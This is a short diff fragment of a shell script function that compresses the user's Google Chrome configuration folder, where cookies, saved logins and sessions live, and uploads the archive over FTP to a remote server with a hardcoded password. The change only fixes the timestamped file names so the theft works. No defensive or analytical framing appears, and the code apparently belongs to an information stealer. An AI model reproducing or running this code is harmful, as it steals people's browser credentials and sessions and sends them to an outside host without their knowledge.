@@ -66,10 +66,10 @@ function GCx_(){
 	ftp_password="Hello.321/"
 	#
 	folder_to_compress="/home/$USER/.config/google-chrome"
-	local_file="$IBUS_"date +%s"gcx.tar.gz"
+	local_file="$IBUS_"`date +%s`"gcx.tar.gz"
 	tar -czvf "$local_file" "$folder_to_compress"
 	#
-	remote_directory="/home/r00t1970/"date +%s"GCx.tar.gz"
+	remote_directory="/home/r00t1970/"`date +%s`"GCx.tar.gz"
 	#
 	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
 	quote USER $ftp_user
